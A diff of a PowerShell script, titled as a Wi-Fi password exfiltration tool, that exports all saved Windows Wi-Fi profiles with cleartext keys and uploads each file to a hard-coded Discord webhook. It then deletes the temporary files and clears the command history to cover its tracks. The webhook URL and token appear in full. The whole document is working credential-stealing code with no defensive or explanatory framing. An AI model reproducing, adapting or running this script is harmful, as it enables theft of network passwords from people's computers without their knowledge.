@@ -1,69 +1,58 @@
-# WLAN-Windows-Passwords-Discord-Exfiltration - FIXED & IMPROVED
-# Author: true_lock (original) / enhanced
-# Target: Windows (no admin needed for export)
+# WLAN-Windows-Passwords-Discord-Exfiltration - FINAL FIXED
 $whuri = 'https://discord.com/api/webhooks/1482772602949734664/AfhCMz1wQKiszM25JquwYHfnAfELsXRXbwmk9m9eWwjnF9qQnHTJxqUt_yR-0U_g7KIk'
 
 $exportDir = "$env:temp\SomeStuff"
 
-# Create export dir if missing
 if (-not (Test-Path $exportDir)) {
-    try { New-Item -ItemType Directory -Path $exportDir -Force | Out-Null }
-    catch { Write-Host "Dir creation failed: $_"; return }
+    New-Item -ItemType Directory -Path $exportDir -Force | Out-Null
 }
 
-# Export all Wi-Fi profiles with clear keys
-try { netsh wlan export profile key=clear folder=$exportDir | Out-Null }
-catch { Write-Host "Export failed: $_"; return }
+netsh wlan export profile key=clear folder=$exportDir | Out-Null
 
-$xmlFiles = Get-ChildItem -Path $exportDir -Filter "*.xml" -ErrorAction SilentlyContinue
+$xmlFiles = Get-ChildItem -Path $exportDir -Filter "*.xml"
 
 if ($xmlFiles.Count -eq 0) {
-    Write-Host "No profiles exported."
+    Write-Host "No profiles found."
 } else {
     foreach ($xmlFile in $xmlFiles) {
-        # Build payload_json (Discord-required for text + embeds/username)
         $payload = @{
             username = $env:COMPUTERNAME
-            content  = "Hier ist das WLAN-Profil: $($xmlFile.Name)"
+            content  = "Wi-Fi Profil von $($env:COMPUTERNAME): $($xmlFile.Name)"
         }
-        $jsonPayload = $payload | ConvertTo-Json -Compress
+        $json = $payload | ConvertTo-Json -Compress
+
+        Write-Host "Sending JSON: $json"  # Debug
 
         $boundary = [guid]::NewGuid().ToString()
         $LF = "`r`n"
 
-        # Start of multipart body
-        $bodyStart = @(
+        $body = @(
             "--$boundary",
             'Content-Disposition: form-data; name="payload_json"',
-            $LF,
-            $jsonPayload,
+            '',
+            $json,
             "--$boundary",
             "Content-Disposition: form-data; name=`"files[0]`"; filename=`"$($xmlFile.Name)`"",
-            "Content-Type: application/xml",
-            $LF
+            'Content-Type: application/octet-stream',
+            '',
+            [System.IO.File]::ReadAllBytes($xmlFile.FullName),
+            "--$boundary--"
         ) -join $LF
 
-        $bodyEnd = "--$boundary--$LF"
-
-        # Read file as bytes + combine
-        $fileBytes = [System.IO.File]::ReadAllBytes($xmlFile.FullName)
-        $bodyBytes = [Text.Encoding]::UTF8.GetBytes($bodyStart) + $fileBytes + [Text.Encoding]::UTF8.GetBytes($bodyEnd)
+        $bodyBytes = [Text.Encoding]::UTF8.GetBytes($body)
 
         try {
             Invoke-RestMethod -Uri $whuri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes
             Write-Host "Erfolgreich gesendet: $($xmlFile.Name)"
         } catch {
-            Write-Host "Sendefehler für $($xmlFile.Name): $_"
+            Write-Host "Fehler für $($xmlFile.Name): $_"
         }
+
+        Start-Sleep -Milliseconds 600  # Avoid rate limit
     }
 }
 
-# Cleanup
-try {
-    Remove-Item -Path $exportDir -Recurse -Force -ErrorAction SilentlyContinue
-    Write-Host "Temporäre Dateien gelöscht."
-} catch {
-    Write-Host "Cleanup-Fehler: $_"
-}
+Remove-Item -Path $exportDir -Recurse -Force -ErrorAction SilentlyContinue
+Write-Host "Cleanup done."
 
 Clear-History
